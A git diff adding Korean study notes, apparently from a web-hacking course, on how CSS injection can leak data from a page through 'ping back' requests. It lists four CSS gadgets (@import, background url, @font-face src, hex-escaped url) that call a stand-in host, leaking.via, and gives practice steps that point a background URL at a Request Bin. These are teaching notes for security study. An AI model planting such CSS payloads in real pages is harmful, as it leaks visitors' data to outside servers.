@@ -52,6 +52,40 @@
 <br/>
 
 ### 웹 페이지 내 데이터 탈취: IP Ping Back
+* 📌 클라이언트 사이드 공격을 통해 데이터를 외부로 탈취하기 위한 전제 조건: *공격자의 서버로 요청을 보낼 수 있어야 함*
+    - CSS 속성으로 외부 속성(Ping Back)을 전송하는 방법
+        + CSS는 다른 사이트의 이미지나 폰트 등 외부 리소스를 불러오는 기능을 제공함 <br/> &nbsp;&nbsp; → 여러 방법이 존재하면 cure53의 HTTPLeaks 가젯을 이용하는 것이 대표적임
+* 예시: CSS Injection을 통한 ```h1```의 글자 색 변경 방법
+    ```css
+    /* CSS 가젯 1: 외부 CSS 파일을 로드 → 모든 속성 중 가장 상단에 위치해야 함 (그렇지 않으면 @import는 무시됨) */
+    @import 'https://leaking.via/css-import-string';
+    @import url(https://leaking.via/css-import-url); /* url 함수: URL를 불러오는 역할을 함 (상황에 따라서 선택적으로 사용) */
+
+    /* CSS 가젯 2: background 속성으로 요소의 배경을 변경할 때 사용할 이미지를 불러옴 */
+    background: url(https://leaking.via/css-background);
+
+    /* CSS 가젯 3: 불러올 폰트 파일의 주소를 지정함 */
+    @font-face {
+        font-family: leak;
+        src: url(https://leaking.via/css-font-src);
+    }
+
+    /* CSS 가젯 4: CSS에서 함수를 호출할 때 ascii 형태의 "url"이 아닌 hex 형태인 "\000075\000072\00006C"도 지원함 */
+    background-image: \000075\000072\00006C(https://leaking.via/css-escape-url-2);
+    ```
+    + 이러한 CSS 가젯들 중 하나를 사용해 페이지 내에서 외부 서버로 요청을 보낼 수 있음
+    + 실습 과정
+        | 순서 | 설명 |
+        |:---:|------|
+        | 01 | 요청을 받을 외부 웹 서버를 준비함 (여기서는 드림핵 툴즈의 Request Bin 기능을 이용함) |
+        | 02 | **개발자 도구의 [Network] 탭**에서 요청을 기록함 → 📌 *CSS Injection 성공 여부를 확인할 수 있음* |
+        | 03 | 외부 웹 서버 주소를 ```body```의 ```background``` 속성의 값으로 설정함 <br/> &nbsp;&nbsp; → ```yellow: background: url("https://RANDOMHOST.request.dreamhack.games/ping-back");```
+        | 04 | 개발자 도구에서 드림핵 툴즈로 보낸 요청을 확인하고, 드램핵 툴즈의 Request Bin에서도 수신한 요청을 확인함 |
+
+
+<br/><br/>
+
+## CSS Injection: 데이터 탈취 (입력 박스 내용 탈취)
 
 
 <br/><br/><br/><br/>
